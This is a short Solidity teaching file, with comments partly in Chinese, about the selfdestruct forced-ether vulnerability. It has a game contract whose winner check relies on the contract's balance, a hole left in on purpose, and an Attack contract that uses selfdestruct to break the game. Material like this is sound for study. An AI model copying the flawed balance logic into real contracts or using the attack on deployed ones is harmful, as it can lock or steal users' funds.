// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @dev 合约自毁：恶意合约可以使用自毁来强制向任何合约发送以太币
 */

contract SelfDestruct {
    uint public targetAmount = 10 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

// 攻击合约
contract Attack {
    SelfDestruct self;

    constructor(SelfDestruct _self) {
        self = SelfDestruct(_self);
    }

    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 10 ether

        // cast address to payable
        address payable addr = payable(address(self));
        selfdestruct(addr);
    }
}
